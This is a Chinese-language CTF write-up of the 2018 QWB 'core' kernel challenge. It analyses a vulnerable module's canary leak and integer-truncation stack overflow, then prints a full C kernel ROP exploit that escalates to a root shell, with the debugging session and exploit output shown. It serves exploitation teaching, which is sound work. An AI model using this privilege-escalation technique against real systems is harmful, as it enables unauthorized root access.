
## kernel ROP - 2018强网杯 - core
### 分析
题目给了 `bzImage`，`core.cpio`，`start.sh` 以及带符号表的 `vmlinux` 四个文件

前三个文件我们已经知道了作用，`vmlinux` 则是静态编译，未经过压缩的 kernel 文件，相对应的 `bzImage` 可以理解为压缩后的文件，更详细的可以看 [stackexchange](https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml)

vmlinux 未经过压缩，也就是说我们可以从 vmlinux 中找到一些 gadget，我们先把 gadget 保存下来备用。 

> 建议使用 [Ropper](https://github.com/sashs/Ropper) 来寻找 gadget，在我测试时，ropper 用了两分半钟提取出了所有的 gadget，而 [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) 用了半个小时耗尽了内存还没跑出结果。。。

```bash
give_to_player [master●] time ropper --file ./vmlinux --nocolor > g1
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
ropper --file ./vmlinux --nocolor > g1  147.42s user 25.68s system 111% cpu 2:35.17 total

give_to_player [master●] time ROPgadget --binary ./vmlinux > g2
[2]    16597 killed     ROPgadget --binary ./vmlinux > g2
ROPgadget --binary ./vmlinux > g2  1064.39s user 42.52s system 54% cpu 33:35.89 total

```

如果题目没有给 vmlinux，可以通过 [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) 提取。
```bash
CISCN2017_babydriver [master●●] ./extract-vmlinux ./bzImage > vmlinux
CISCN2017_babydriver [master●●] file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e993ea9809ee28d059537a0d5e866794f27e33b4, stripped
```

看一下 start.sh
```bash
give_to_player [master●●] ls
bzImage  core.cpio  start.sh  vmlinux
give_to_player [master●●] bat start.sh 
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: start.sh
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ qemu-system-x86_64 \
   2   │ -m 64M \
   3   │ -kernel ./bzImage \
   4   │ -initrd  ./core.cpio \
   5   │ -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
   6   │ -s  \
   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
   8   │ -nographic  \
───────┴─────────────────────────────────────────────────────────────────────────────────
```
发现内核开启了 kaslr 保护。

解压 `core.cpio` 后，看一下 init
```bash
give_to_player [master●] file core.cpio 
core.cpio: gzip compressed data, last modified: Fri Mar 23 13:41:13 2018, max compression, from Unix, original size 53442048
give_to_player [master●] mkdir core
give_to_player [master●] cd core 
core [master] mv ../core.cpio core.cpio.gz
core [master●] gunzip ./core.cpio.gz 
core [master●] cpio -idm < ./core.cpio
104379 块
core [master●] bat init 
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: init
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/sh
   2   │ mount -t proc proc /proc
   3   │ mount -t sysfs sysfs /sys
   4   │ mount -t devtmpfs none /dev
   5   │ /sbin/mdev -s
   6   │ mkdir -p /dev/pts
   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts
   8   │ chmod 666 /dev/ptmx
   9   │ cat /proc/kallsyms > /tmp/kallsyms
  10   │ echo 1 > /proc/sys/kernel/kptr_restrict
  11   │ echo 1 > /proc/sys/kernel/dmesg_restrict
  12   │ ifconfig eth0 up
  13   │ udhcpc -i eth0
  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0
  15   │ route add default gw 10.0.2.2 
  16   │ insmod /core.ko
  17   │ 
  18   │ poweroff -d 120 -f &
  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh
  20   │ echo 'sh end!\n'
  21   │ umount /proc
  22   │ umount /sys
  23   │ 
  24   │ poweroff -d 0  -f
───────┴────────────────────────────
```
发现了几处有意思的地方：

- 第 9 行中把 `kallsyms` 的内容保存到了 `/tmp/kallsyms` 中，那么我们就能从 `/tmp/kallsyms` 中读取 `commit_creds`，`prepare_kernel_cred` 的函数的地址了
- 第 10 行把 `kptr_restrict` 设为 1，这样就不能通过 `/proc/kallsyms` 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了
- 第 11 行把 `dmesg_restrict` 设为 1，这样就不能通过 `dmesg` 查看 kernel 的信息了
- 第 18 行设置了定时关机，为了避免做题时产生干扰，直接把这句删掉然后重新打包

同时还发现了一个 shell 脚本 `gen_cpio.sh`
```bash
core [master●] bat gen_cpio.sh 
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: gen_cpio.sh
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ find . -print0 \
   2   │ | cpio --null -ov --format=newc \
   3   │ | gzip -9 > $1
───────┴─────────────────────────────────────────────────────────────────────────────────
```

从名称和内容都可以看出这是一个方便打包的脚本，我们修改好 init 后重新打包，尝试运行 kernel
```bash
core [master●●] vim init 
core [master●●] rm core.cpio 
core [master●●] ./gen_cpio.sh core.cpio
.
./usr
./usr/sbin
./usr/sbin/popmaildir
......
......
./core.cpio
./core.ko
129851 块
core [master●●] ls
bin        core.ko  gen_cpio.sh  lib    linuxrc  root  sys  usr
core.cpio  etc      init         lib64  proc     sbin  tmp  vmlinux
core [master●●] mv core.cpio ..
core [master●●] cd ..
give_to_player [master●●] ./start.sh 
```

但这时候又遇到了新问题，内核运行不起来，从一闪即逝的报错信息中能看到是因为分配的内存过小，`start.sh` 中 `-m` 分配的是 64M，修改为 128M，终于能运行起来了。
```bash
/ $ lsmod
core 16384 0 - Live 0x0000000000000000 (O)
......
......
give_to_player [master●●] cp core/core.ko .
give_to_player [master●●] check ./core.ko
./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436683d
[*] '/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```
可以看出开启了 canary 保护，用 IDA 打开进一步分析。

**init_module()** 注册了 `/proc/core`
```C
__int64 init_module()
{
  core_proc = proc_create("core", 438LL, 0LL, &core_fops);
  printk("\x016core: created /proc/core entry\n");
  return 0LL;
}
```
**exit_core()** 删除 `/proc/core`
```C
__int64 exit_core()
{
  __int64 result; // rax

  if ( core_proc )
    result = remove_proc_entry("core");
  return result;
}
```

**core_ioctl()** 定义了三条命令，分别调用 **core_read()**，**core_copy_func()** 和设置全局变量 **off**
```C
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);
      break;
    case 0x6677889C:
      printk("\x016core: %d\n");
      off = a3;
      break;
    case 0x6677889A:
      printk("\x016core: called core_copy\n");
      core_copy_func(a3);
      break;
  }
      core_copy_func(v3);
}
```

**core_read()** 从 `v4[off]` 拷贝 64 个字节到用户空间，但要注意的是全局变量 `off` 使我们能够控制的，因此可以合理的控制 `off` 来 leak canary 和一些地址
```C 
void __fastcall core_read(__int64 a1)
{
  __int64 v1; // rbx
  char *v2; // rdi
  signed __int64 i; // rcx
  char v4[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 v5; // [rsp+40h] [rbp-10h]

  v1 = a1;
  v5 = __readgsqword(0x28u);
  printk("\x016core: called core_read\n");
  printk("\x016%d %p\n");
  v2 = v4;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)v2 = 0;
    v2 += 4;
  }
  strcpy(v4, "Welcome to the QWB CTF challenge.\n");
  if ( copy_to_user(v1, &v4[off], 64LL) )
    __asm { swapgs }
}
```

**core_copy_func()** 从全局变量 `name` 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 `unsigned __int16`，但传递的长度是 `signed __int64`，因此如果控制传入的长度为 `0xffffffffffff0000|(0x100)` 等值，就可以栈溢出了
```C
void __fastcall core_copy_func(signed __int64 a1)
{
  char v1[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 v2; // [rsp+40h] [rbp-10h]

  v2 = __readgsqword(0x28u);
  printk("\x016core: called core_writen");
  if ( a1 > 63 )
    printk("\x016Detect Overflow");
  else
    qmemcpy(v1, name, (unsigned __int16)a1);    // overflow
}
```

**core_write()** 向全局变量 `name` 上写，这样通过 `core_write()` 和 `core_copy_func()` 就可以控制 ropchain 了
```C
signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx

  v3 = a3;
  printk("\x016core: called core_writen");
  if ( v3 <= 0x800 && !copy_from_user(name, a2, v3) )
    return (unsigned int)v3;
  printk("\x016core: error copying data from userspacen");
  return 0xFFFFFFF2LL;
}
```

### 思路
经过如上的分析，可以得出以下的思路：

1. 通过 ioctl 设置 off，然后通过 core\_read() leak 出 canary
2. 通过 core\_write() 向 name 写，构造 ropchain
3. 通过 core\_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop
4. 通过 rop 执行 `commit_creds(prepare_kernel_cred(0))`
5. 返回用户态，通过 system("/bin/sh") 等起 shell

解释一下：

- 如何获得 commit\_creds()，prepare\_kernel\_cred() 的地址？
	- /tmp/kallsyms 中保存了这些地址，可以直接读取，同时根据偏移固定也能确定 gadgets 的地址
- 如何返回用户态？
	- `swapgs; iretq`，之前说过需要设置 `cs, rflags` 等信息，可以写一个函数保存这些信息

```C
// intel flavor assembly
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}

// at&t flavor assembly
void save_stats() {
asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"movq %%rsp, %3\n"
	"pushfq\n"
	"popq %2\n"
	:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
	:
	: "memory"
);
}
```

- Why bother returning to Userspace?
	- Most useful things we want to do are much easier from userland.
	- In KernelSpace, there’s no easy way to:
		- Modify the filesystem
		- Create a new process
		- Create network connections

### Exploit
先说一下怎么调试，qemu 内置有 gdb 的接口，通过 help 查看
```bash
give_to_player [master●●] qemu-system-x86_64 --help | grep gdb
						  -gdb dev        wait for gdb connection on 'dev'
						  -s              shorthand for -gdb tcp::1234
```
即可以通过 `-gdb tcp:port` 或者 `-s` 来开启调试端口，`start.sh` 中已经有了 `-s`，不必再自己设置。

另外通过 `gdb ./vmlinux` 启动时，虽然加载了 kernel 的符号表，但没有加载驱动 `core.ko` 的符号表，可以通过 `add-symbol-file core.ko textaddr` 加载
```bash
pwndbg> help add-symbol-file
Load symbols from FILE, assuming FILE has been dynamically loaded.
Usage: add-symbol-file FILE ADDR [-s <SECT> <SECT_ADDR> -s <SECT> <SECT_ADDR> ...]
ADDR is the starting address of the file's text.
The optional arguments are section-name section-address pairs and
should be specified if the data and bss segments are not contiguous
with the text.  SECT is a section name to be loaded at SECT_ADDR.
```

.text 段的地址可以通过 `/sys/modules/core/section/.text` 来查看，查看需要 root 权限，因此为了方便调试，我们再改一下 `init`
```bash
# setsid /bin/cttyhack setuidgid 1000 /bin/sh
setsid /bin/cttyhack setuidgid 0 /bin/sh
```
重新打包，这样启动的时候就是 root 权限了。

比如：
```bash
// qemu 内
/ # cat /sys/module/core/sections/.text 
0xffffffffc018b000
......
......

// qemu 外
give_to_player [master●●] gdb ./vmlinux -q
pwndbg: loaded 174 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./vmlinux...(no debugging symbols found)...done.
pwndbg> add-symbol-file ./core.ko 0xffffffffc018b000
add symbol table from file "./core.ko" at
	.text_addr = 0xffffffffc018b000
Reading symbols from ./core.ko...(no debugging symbols found)...done.
pwndbg> b core_read					# 加载了符号表，就可以直接对函数下断点了
Breakpoint 1 at 0xffffffffc018b063
pwndbg> b *(0xffffffffc018b000+0xCC)# 或者根据基地址直接下断点
Breakpoint 2 at 0xffffffffc018b0cc
pwndbg> target remote localhost:1234
Remote debugging using localhost:1234
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
0xffffffffa1e6e7d2 in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0xffffffffa1e6e7d0 ◂— sti     /* 0x2e66001f0fc3f4fb */
 RBX  0xffffffffa2810480 ◂— 0x80000000
 RCX  0x0
 RDX  0x0
 RDI  0x0
 RSI  0x0
 R8   0xffff8f250641bf20 —▸ 0xffffb0f380647960 ◂— 1
 R9   0x0
 R10  0x0
 R11  0x32e
 R12  0xffffffffa2810480 ◂— 0x80000000
 R13  0xffffffffa2810480 ◂— 0x80000000
 R14  0x0
 R15  0x0
 RBP  0x0
 RSP  0xffffffffa2803eb8 —▸ 0xffffffffa16b65a0 ◂— 0xff894cf6894c9feb
 RIP  0xffffffffa1e6e7d2 ◂— ret     /* 0x1f0f2e66001f0fc3 */
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
 ► 0xffffffffa1e6e7d2    ret    <0xffffffffa16b65a0>
    ↓
   0xffffffffa16b65a0    jmp    0xffffffffa16b6541
    ↓
   0xffffffffa16b6541    or     byte ptr ds:[r12 + 2], 0x20
   0xffffffffa16b6548    pushfq
   0xffffffffa16b6549    pop    rax
   0xffffffffa16b654a    test   ah, 2
   0xffffffffa16b654d    je     0xffffffffa16b65e5

   0xffffffffa16b6553    call   0xffffffffa16d4720

   0xffffffffa16b6558    call   0xffffffffa16b6430

   0xffffffffa16b655d    mov    rax, qword ptr [rbx]
   0xffffffffa16b6560    test   al, 8
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0xffffffffa2803eb8 —▸ 0xffffffffa16b65a0 ◂— 0xff894cf6894c9feb
01:0008│      0xffffffffa2803ec0 ◂— 0xc2
02:0010│      0xffffffffa2803ec8 —▸ 0xffffffffa2cc4900 ◂— 0xcccccccccccccccc
03:0018│      0xffffffffa2803ed0 —▸ 0xffff8f2506688900 ◂— jb     0xffff8f2506688971 /* 0x65642f3d746f6f72; 'root=/dev/ram' */
04:0020│      0xffffffffa2803ed8 —▸ 0xffffffffa2ccc2c0 ◂— 0xcccccccccccccccc
05:0028│      0xffffffffa2803ee0 ◂— 0x0
... ↓
07:0038│      0xffffffffa2803ef0 —▸ 0xffffffffa16b673a ◂— jmp    0xffffffffa16b6735 /* 0x564190909090f9eb */
pwndbg> c
Continuing.
......
......


// qemu 内
/ # /tmp/exploit
[*]status has been saved.
commit_creds addr: 0xffffffffa169c8e0
vmlinux_base addr: 0xffffffffa1600000
prepare_kernel_cred addr: 0xffffffffa169cce0
[*]set off to 64
[*]read to buf.
......
......

// qemu 外
pwndbg> c
Continuing.
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!

Breakpoint 1, 0xffffffffc018b063 in core_read ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0xffffffffc018b15f (core_ioctl) ◂— cmp    esi, 0x6677889b /* 0x48536677889bfe81 */
 RBX  0x7ffee6e56f10 ◂— 0
 RCX  0x0
 RDX  0x7ffee6e56f10 ◂— 0
 RDI  0x7ffee6e56f10 ◂— 0
 RSI  0x6677889b
 R8   0xffff8f25071b38ac ◂— 1
 R9   0x1
 R10  0x0
 R11  0x0
 R12  0xffff8f250540b7a0 ◂— mov    dh, 0x81 /* 0x581b6 */
 R13  0x6677889b
 R14  0x7ffee6e56f10 ◂— 0
 R15  0x0
 RBP  0x7ffee6e56f10 ◂— 0
 RSP  0xffffb0f3800dbe68 —▸ 0xffffffffc018b19b (core_ioctl+60) ◂— 0xc7c748d6894818eb
 RIP  0xffffffffc018b063 (core_read) ◂— push   rbx /* 0x7bc7c748fb894853 */
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
 ► 0xffffffffc018b063 <core_read>       push   rbx
   0xffffffffc018b064 <core_read+1>     mov    rbx, rdi
   0xffffffffc018b067 <core_read+4>     mov    rdi, -0x3fe73f85
   0xffffffffc018b06e <core_read+11>    sub    rsp, 0x48
   0xffffffffc018b072 <core_read+15>    mov    rax, qword ptr gs:[0x28]
   0xffffffffc018b07b <core_read+24>    mov    qword ptr [rsp + 0x40], rax
   0xffffffffc018b080 <core_read+29>    xor    eax, eax
   0xffffffffc018b082 <core_read+31>    call   0xffffffffa16c6845

   0xffffffffc018b087 <core_read+36>    mov    rsi, qword ptr [rip + 0x2b72]
   0xffffffffc018b08e <core_read+43>    mov    rdx, rbx
   0xffffffffc018b091 <core_read+46>    mov    rdi, -0x3fe73f6b
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0xffffb0f3800dbe68 —▸ 0xffffffffc018b19b (core_ioctl+60) ◂— 0xc7c748d6894818eb
01:0008│      0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr [r8], rax /* 0x81b6f000014b */
02:0010│      0xffffb0f3800dbe78 —▸ 0xffffffffa17dd6d1 ◂— 0xe824048948df8948
03:0018│      0xffffb0f3800dbe80 ◂— 0x889b
04:0020│      0xffffb0f3800dbe88 —▸ 0xffff8f2507680d00 ◂— 0
05:0028│      0xffffb0f3800dbe90 —▸ 0xffffffffa178ecfa ◂— 0x9e840ffffffdfd3d
06:0030│      0xffffb0f3800dbe98 —▸ 0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr [r8], rax /* 0x81b6f000014b */
07:0038│      0xffffb0f3800dbea0 ◂— 0x10
Breakpoint core_read
pwndbg>
```

最终 exp
```C
QWB2018_core [master●●] cat exploit.c 
// gcc exploit.c -static -masm=intel -g -o exploit
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void spawn_shell()
{
	if(!getuid())
	{
		system("/bin/sh");
	}
	else
	{
		puts("[*]spawn shell error!");
	}
	exit(0);
}

size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
/* 
 * give_to_player [master●●] check ./core.ko
   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d
   [*] '/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko'
       Arch:     amd64-64-little
       RELRO:    No RELRO
       Stack:    Canary found
       NX:       NX enabled
       PIE:      No PIE (0x0)
*/
size_t vmlinux_base = 0;
size_t find_symbols()
{
	FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");
	/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */

	if(kallsyms_fd < 0)
	{
		puts("[*]open kallsyms error!");
		exit(0);
	}

	char buf[0x30] = {0};
	while(fgets(buf, 0x30, kallsyms_fd))
	{
		if(commit_creds & prepare_kernel_cred)
			return 0;

		if(strstr(buf, "commit_creds") && !commit_creds)
		{
			/* puts(buf); */
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			/* printf("hex: %s\n", hex); */
			sscanf(hex, "%llx", &commit_creds);
			printf("commit_creds addr: %p\n", commit_creds);
			/*
			 * give_to_player [master●●] bpython
				bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n
				>>> from pwn import *
				>>> vmlinux = ELF("./vmlinux")
				[*] '/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli'
				    Arch:     amd64-64-little
				    RELRO:    No RELRO
				    Stack:    Canary found
				    NX:       NX disabled
				    PIE:      No PIE (0xffffffff81000000)
				    RWX:      Has RWX segments
				>>> hex(vmlinux.sym['commit_creds'] - 0xffffffff81000000)
				'0x9c8e0'
			*/
			vmlinux_base = commit_creds - 0x9c8e0;
			printf("vmlinux_base addr: %p\n", vmlinux_base);
		}

		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
		{
			/* puts(buf); */
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%llx", &prepare_kernel_cred);
			printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
			vmlinux_base = prepare_kernel_cred - 0x9cce0;
			/* printf("vmlinux_base addr: %p\n", vmlinux_base); */
		}
	}

	if(!(prepare_kernel_cred & commit_creds))
	{
		puts("[*]Error!");
		exit(0);
	}

}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}

void set_off(int fd, long long idx)
{
	printf("[*]set off to %ld\n", idx);
	ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd, char *buf)
{
	puts("[*]read to buf.");
	ioctl(fd, 0x6677889B, buf);

}

void core_copy_func(int fd, long long size)
{
	printf("[*]copy from user with size: %ld\n", size);
	ioctl(fd, 0x6677889A, size);
}

int main()
{
	save_status();
	int fd = open("/proc/core", 2);
	if(fd < 0)
	{
		puts("[*]open /proc/core error!");
		exit(0);
	}
	
	find_symbols();
	// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;
	ssize_t offset = vmlinux_base - raw_vmlinux_base;

	set_off(fd, 0x40);

	char buf[0x40] = {0};
	core_read(fd, buf);
	size_t canary = ((size_t *)buf)[0];
	printf("[+]canary: %p\n", canary);

	size_t rop[0x1000] = {0};

	int i;
	for(i = 0; i < 10; i++)
	{
		rop[i] = canary;
	}
	rop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred;			// prepare_kernel_cred(0)

	rop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret
	rop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret
	rop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx; 
	rop[i++] = commit_creds;
	
	rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret
	rop[i++] = 0;

	rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; 

	rop[i++] = (size_t)spawn_shell;			// rip 
	
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;

	write(fd, rop, 0x800);
	core_copy_func(fd, 0xffffffffffff0000 | (0x100));

	return 0;
}
```

### get root shell

```bash
QWB2018_core [master●●] gcc exploit.c -static -masm=intel -g -o exploit // 如果使用 intel 汇编需要加上 -masm=intel 
QWB2018_core [master●●] cp exploit give_to_player/core/tmp
cp：是否覆盖'give_to_player/core/tmp/exploit'？ y
QWB2018_core [master●●] cd give_to_player/core
core [master●●] ./gen_cpio.sh core.cpio
.
./usr
./usr/sbin
......
......

core [master●●] mv core.cpio ..
mv：是否覆盖'../core.cpio'？ y
core [master●●] cd ..
give_to_player [master●●] ./start.sh

/ $ ls /tmp/
exploit   kallsyms
/ $ id
uid=1000(chal) gid=1000(chal) groups=1000(chal)
/ $ /tmp/exploit
[*]status has been saved.
commit_creds addr: 0xffffffffbd09c8e0
vmlinux_base addr: 0xffffffffbd000000
prepare_kernel_cred addr: 0xffffffffbd09cce0
[*]set off to 64
[*]read to buf.
[+]canary: 0x6be486f377bb8600
[*]copy from user with size: -65280
/ # id
uid=0(root) gid=0(root)
```
当然这个题目也有其他做法，下篇再分析。

## Reference and Thanks to

https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml

https://blog.csdn.net/gatieme/article/details/78311841

https://bbs.pediy.com/thread-247054.htm

https://veritas501.space/2018/06/05/qwb2018%20core/

http://p4nda.top/2018/07/13/ciscn2018-core/
